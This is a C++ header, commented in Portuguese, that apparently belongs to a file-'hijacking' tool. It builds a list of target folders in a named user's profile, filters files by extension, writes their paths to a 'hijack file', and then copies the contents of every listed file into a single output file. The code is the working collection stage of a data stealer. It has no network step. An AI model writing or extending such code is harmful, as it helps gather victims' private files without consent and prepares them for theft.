// Módulo responsável por juntar tudo em um arquivo só

#ifndef HIJACK_HPP
#define HIJACK_HPP

#include <vector>
#include <string>
#include <fstream>


#include "ReadFile.hpp"
#include "ListDir.hpp"
#include "BlackList.hpp"

// Função responsável por definir a lista de pastas alvo
std::vector<std::string> Search() {
	readFileClass file("./Folders.txt");
	file.read();

	std::string placeholderText = "<USER>";

	std::string userName;
	std::cout << "Username -> ";
	std::cin >> userName;

	std::vector<std::string> response = file.getValue();

	for (std::string& item : response) {
		size_t pos = item.find(placeholderText);
		if (pos != std::string::npos) {
			item.replace(pos, placeholderText.length(), userName);
		}
	}

	return response;
}

// Função responsável por criar o arquivo de sequestro
void FileSearch(std::vector<std::string> Folders) {
	readFileClass file("./Extensions.txt");
	file.read();
	std::vector<std::string> blackList = file.getValue();

	std::string response;

	for (std::string path : Folders) {
		std::vector<std::string> itens = ListDir(path);

		for (std::string item : itens) {
			if (is_a_file(path + "\\" + item)) {
				if (!BlackList(item, blackList)) {
					response += path + "\\" + item + "\n";
				}
			}
		}
	}

	std::cout << "File Name -> ";
	std::string fName;
	std::cin >> fName;

	std::ofstream Hijackfile(fName);

	if (Hijackfile.is_open()) {
		Hijackfile << response;

		Hijackfile.close();
	}
	else {
		std::cerr << "FILE ERROR";
	}
}

// Função responsável por sequestrar todos os arquivos presentes no arquivo de sequestro
void HIJACK() {
	std::string response;

	std::string fileName;
	std::cout << "Hijack File Name -> ";
	std::cin >> fileName;

	readFileClass hiFile(fileName);
	hiFile.read();

	std::vector<std::string> fileContent = hiFile.getValue();

	for (std::string item : fileContent) {
		readFileClass FILE(item);

		if (FILE.read() == 0) {
			response += item + "\n";
			for (std::string content : FILE.getValue()) {
				response += content + "\n";
			}
		}
		else {
			std::cout << "FILE NAME ERROR: " + item << std::endl;
		}
	}

	std::cout << "File Name -> ";
	std::string fName;
	std::cin >> fName;

	std::ofstream Hijackfile(fName);

	if (Hijackfile.is_open()) {
		Hijackfile << response;

		Hijackfile.close();
	}
	else {
		std::cerr << "FILE ERROR";
	}
}

#endif